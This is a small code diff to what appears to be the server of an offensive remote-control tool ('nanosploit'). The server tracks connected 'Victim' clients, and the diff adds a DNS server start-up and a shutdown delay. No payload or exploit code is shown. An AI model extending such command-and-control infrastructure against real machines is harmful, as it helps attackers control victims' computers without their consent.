@@ -3,8 +3,10 @@ import ssl
 import os
 import threading
 import subprocess
+import time
 
 from nanosploit.victim import Victim
+from nanosploit.dns import init_dns_server
 
 # Static globals
 BANNER = """
@@ -124,6 +126,9 @@ def main():
     # Initiate secure server socket and return it
     ss = init_server()
 
+    # Initiate DNS server
+    init_dns_server()
+
     # Init clients list
     clients: dict[str, Victim] = {}
 
@@ -142,6 +147,7 @@ def main():
         # Close every connection
         for i, client in clients.items():
             client.conn.close()
+        time.sleep(1)
         ss.close()
 
 
